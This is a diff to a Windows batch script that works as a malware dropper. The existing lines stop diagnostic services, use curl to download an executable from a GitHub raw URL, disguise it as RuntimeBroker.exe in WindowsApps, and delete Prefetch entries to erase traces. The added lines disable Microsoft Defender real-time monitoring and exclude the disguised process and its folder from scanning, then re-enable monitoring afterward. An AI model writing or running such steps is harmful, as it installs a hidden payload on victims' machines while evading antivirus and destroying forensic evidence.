@@ -1,3 +1,6 @@
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
+powershell -Command "Add-MpPreference -ExclusionProcess 'RuntimeBroker.exe'" 2>nul
+powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\WindowsApps'" 2>nul
 net stop DiagTrack /y & net stop DPS /y & net stop SysMain /y & net stop WSearch /y & net stop PcaSvc /y
 curl -L -o "%TEMP%\RuntimeBroker.exe" "https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
 move /Y "%TEMP%\RuntimeBroker.exe" "%LOCALAPPDATA%\Microsoft\WindowsApps\RuntimeBroker.exe"
@@ -7,3 +10,4 @@ del /q "C:\Windows\Prefetch\CMD*.pf" 2>nul
 del /q "C:\Windows\Prefetch\CURL*.pf" 2>nul
 del /q "C:\Windows\Prefetch\RUNTIMEBROKER*.pf" 2>nul
 net start DiagTrack & net start DPS & net start SysMain & net start WSearch & net start PcaSvc
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" 2>nul
